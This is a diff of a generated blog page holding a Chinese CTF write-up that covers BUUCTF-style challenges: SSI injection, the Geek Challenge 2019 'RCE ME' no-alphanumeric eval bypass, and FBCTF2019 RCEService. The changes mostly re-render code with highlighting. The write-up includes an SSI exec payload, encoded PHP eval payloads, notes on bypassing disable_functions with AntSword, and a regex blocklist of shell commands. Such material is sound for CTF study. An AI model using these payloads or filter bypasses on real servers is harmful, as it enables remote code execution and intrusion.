+<span class="token punctuation">&#125;</span></span></code></pre>
 
 <p>得到一个<code>2020666</code>，拿去发包</p>
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200808171429367.png" alt="image-20200808171429367" loading="lazy"></p>
@@ -287,20 +287,20 @@ for($i &#x3D; 0;$i &lt; 9999999; $i++)&#123;
 <p>payload：<code>username=&lt;!--#exec cmd=&quot;cd ..;cat flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666</code></p>
 <p>访问shtml文件即可得到flag</p>
 <h3 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h3><p>首先题目给出了源码</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
-error_reporting(0);
-if (isset($_GET[&#39;code&#39;])) &#123;
-    $code &#x3D; $_GET[&#39;code&#39;];
-    if (strlen($code) &gt; 40) &#123;
-        die(&quot;This is too Long.&quot;);
-    &#125;
-    if (preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;, $code)) &#123;
-        die(&quot;NO.&quot;);
-    &#125;
-    @eval($code);
-&#125; else &#123;
-    highlight_file(__FILE__);
-&#125;</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span></code></pre>
 
 <p>可以看到可以命令执行，但是过滤了所有的字母和数字，并且限制了字符串发长度不能大于40</p>
 <p>于是构造特殊字符来进行命令执行：</p>
@@ -314,7 +314,7 @@ $&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;
 <p>然后用蚁剑连接，注意这里是不能直接命令执行的，因为<code>disable_function</code>限制了很多的命令执行函数</p>
 <p>用<code>phpinfo()</code>查看一下</p>
 <p>payload：</p>
-<pre class="language-php" data-language="php"><code class="language-php">(~%8F%97%8F%96%91%99%90)();</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 
 <pre class="language-none"><code class="language-none">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,
 pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,
@@ -327,30 +327,30 @@ syslog,imap_open,ld,dl</code></pre>
 <p>根目录下有<code>readflag</code> 和  <code>flag</code>文件，<code>flag</code>读取权限不够，<code>readflag</code>不能执行，需要绕过<code>disable_function</code>，利用蚁剑的插件绕过，执行后在蚁剑终端执行<code>/readflag</code>即可读到flag</p>
 <h3 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h3><p>题目需要用json格式的数据进行命令执行，如：<code>&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</code></p>
 <p>这题应该是比赛时题目给出了源码buu上没放，源码如下：</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-putenv(&#39;PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail&#39;);
+<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PATH=/home/rceservice/jail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-if (isset($_REQUEST[&#39;cmd&#39;])) &#123;
-  $json &#x3D; $_REQUEST[&#39;cmd&#39;];
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-  if (!is_string($json)) &#123;
-    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;
-  &#125; elseif (preg_match(&#39;&#x2F;^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\&#x2F;;-@\[-&#96;|~\x7F]+).*$&#x2F;&#39;, $json)) &#123;
-    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;
-  &#125; else &#123;
-    echo &#39;Attempting to run command:&lt;br&#x2F;&gt;&#39;;
-    $cmd &#x3D; json_decode($json, true)[&#39;cmd&#39;];
-    if ($cmd !&#x3D;&#x3D; NULL) &#123;
-      system($cmd);
-    &#125; else &#123;
-      echo &#39;Invalid input&#39;;
-    &#125;
-    echo &#39;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;
-  &#125;
-&#125;
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span><span class="token punctuation">,</span> <span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Attempting to run command:&lt;br/>'</span><span class="token punctuation">;</span>
+    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span> <span class="token operator">!==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Invalid input'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-?&gt;</code></pre>
+<span class="token delimiter important">?></span></span></code></pre>
 
 <p>过滤了很多东西</p>
 <p><code>putenv(&#39;PATH=/home/rceservice/jail&#39;)</code>，限制了命令执行的环境，用全路径就可以了，问题是waf的绕过</p>
@@ -362,7 +362,7 @@ if (isset($_REQUEST[&#39;cmd&#39;])) &#123;
   const valineConfig = {"enable":true,"appId":"D0RsYpx00piDirHr8rmxtml4-gzGzoHsz","appKey":"aCk3nRmmI5uzkoEoVjtToEe8","placeholder":"不留点什么？","avatar":null,"pageSize":10,"visitor":false,"highlight":true,"recordIP":false,"enableQQ":true,"meta":["nick","mail","link"],"el":"#valine-container","lang":"zh-cn"}
   valineConfig.path = "/posts/c714e372/"
   new Valine(valineConfig)
-}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">湘ICP备2021001321号</a></div><div class="copyright"><span>&copy; 2020 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Extrader</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.5.3</span></div><div class="live_time"><span>本博客已运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">湘ICP备2021001321号</a></div><div class="copyright"><span>&copy; 2020 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Extrader</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.4.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.6.1</span></div><div class="live_time"><span>本博客已运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
   setTimeout(blog_live_time, 1000);
   const start = new Date('2020-01-08T00:00:00');
   const now = new Date();
@@ -377,7 +377,7 @@ if (isset($_REQUEST[&#39;cmd&#39;])) &#123;
   display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
 }
 blog_live_time();
-</script></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+</script></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
   // Handle and trigger popup window
   document.querySelector(".popup-trigger").addEventListener("click", () => {
     document.querySelector(".popup").classList.add("show");
